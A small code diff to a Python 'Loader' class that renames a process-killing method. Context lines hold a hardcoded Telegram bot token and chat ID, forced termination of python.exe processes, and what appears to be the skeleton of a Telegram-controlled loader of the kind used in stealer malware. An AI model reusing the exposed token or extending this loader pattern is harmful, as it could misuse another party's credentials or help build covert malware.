@@ -16,7 +16,7 @@ import threading
 import re
 class Loader():
 	def __init__(self):
-		self.Kill_Another()
+		self.Kill_Self()
 		self.progrm = sys.argv[1]
 		self.token = "1867535261:AAG_wC07CxlM4ga5UfcA2eE_Jxxm9efPcG8"
 		self.chat_id = "1742761281"
@@ -175,7 +175,7 @@ class Loader():
 						os.system("taskkill /IM python.exe /F")
 				except:
 					pass
-	def Kill_Another(self):
+	def Kill_Self(self):
 		for proc in psutil.process_iter():
 				try:
 					if proc.pid != os.getpid() and proc.name() == "python.exe" and "Loader.py" in proc.cmdline():
